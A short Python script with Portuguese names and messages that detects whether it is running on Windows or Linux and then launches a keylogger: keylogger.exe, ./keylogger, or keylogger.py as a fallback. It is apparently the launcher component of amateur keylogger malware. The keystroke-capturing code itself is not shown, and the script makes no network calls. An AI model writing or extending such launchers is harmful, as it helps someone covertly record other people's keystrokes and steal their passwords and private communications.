import subprocess
import platform
import os

sistema_operacional = platform.system()

executavel_linux = "./keylogger"
executavel_windows = "keylogger.exe"
script_python = "keylogger.py"

if sistema_operacional == "Windows":
    print("UAU, Seu sistema operacional é Windows!!!")
    if os.path.isfile(executavel_windows):
        subprocess.Popen([executavel_windows], shell=True)
    else:
        subprocess.Popen(["python", script_python], shell=True)
elif sistema_operacional == "Linux":
    print("UAU, Seu sistema operacional é Linux!!!!!!!")
    if os.path.isfile(executavel_linux):
        subprocess.Popen([executavel_linux], shell=False)
    else:
        subprocess.Popen(["python3", script_python], shell=False)